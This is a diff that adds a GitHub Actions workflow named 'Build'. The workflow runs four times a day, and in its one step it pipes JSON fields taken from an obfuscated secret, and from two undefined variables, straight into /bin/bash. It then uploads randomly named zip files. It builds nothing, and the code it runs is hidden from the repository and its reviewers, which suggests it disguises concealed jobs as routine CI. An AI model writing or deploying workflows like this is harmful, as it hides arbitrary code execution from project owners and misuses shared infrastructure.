@@ -1,0 +1,35 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          kgjc62: ${{ secrets.kgjc62 }}
+        run: |
+          printf '%s' "$kgjc62" | jq -r .tl111 | /bin/bash
+          printf '%s' "$aehj039" | jq -r .ap58594 | /bin/bash
+          echo $v1040 | jq -r .dzwtz2302 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Y9jX68VO
+          path: "*.zip"
+          retention-days: 1
